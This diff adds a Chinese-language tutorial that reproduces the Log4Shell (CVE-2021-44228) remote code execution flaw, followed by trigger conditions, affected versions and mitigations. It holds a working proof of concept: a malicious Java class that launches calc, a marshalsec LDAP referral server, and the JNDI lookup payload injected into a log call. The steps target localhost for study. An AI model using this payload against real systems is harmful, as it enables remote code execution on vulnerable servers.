@@ -1,0 +1,53 @@
+漏洞原因
+在使用org/apache/logging/log4j/spi/AbstractLogger.java log记录日志时，且log等级为执行等级就能触发。原因是log字符串中检测到${}，就会解析其中的字符串尝试使用lookup查询，因此只要注入log参数内容，就有机会实现漏洞利用。
+
+1. 准备要远程执行的恶意代码，命名Log4jRCE.java，用javac编译成class文件：
+public class Log4jRCE {
+   static {
+       try {
+           String [] cmd={"calc"};
+           java.lang.Runtime.getRuntime().exec(cmd).waitFor();
+       }catch (Exception e){
+           e.printStackTrace();
+       }
+   }
+}
+
+1. 在当前目录启动cmd，用python启动一个HTTPServer 服务，python -m http.server 8888，检测一下服务状态 http://127.0.0.1:8888/：
+
+1. 开启JNDI LDAPRefServer:
+git clone https://github.com/mbechler/marshalsec.git
+cd marshalsec
+# Java 8 required
+mvn clean package -DskipTests
+java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8888/#Log4jRCE"
+
+
+在你的项目main方法里添加代码：
+org.apache.logging.log4j.Logger logger = org.apache.logging.log4j.LogManager.getLogger(Demo.class);
+logger.error("${jndi:ldap://127.0.0.1:1389/#Log4jRCE}");
+
+执行远程代码成功，打开了本地的计算器程序。漏洞复现成功。
+
+触发条件
+1. JDK版本11.0.1、8u191、7u201、6u211以下版本。其它版本需要增加代码System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
+2. 系统有可注入入口，比如后端拿到前端传来的字符串，打印了开启日志等级的日志。
+3. 系统使用log4j-api，log4j-core 2.14.1及以下版本
+
+
+   org.apache.logging.log4j
+   log4j-api
+   2.14.1
+
+   org.apache.logging.log4j
+   log4j-core
+   2.14.1
+
+
+建议修复
+● JVM 参数添加 -Dlog4j2.formatMsgNoLookups=true log4j2.formatMsgNoLookups=True 
+● 升级log4j版本2.14.1以上
+● 升级jdk版本
+
+参考链接
+https://github.com/tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce/issues/5
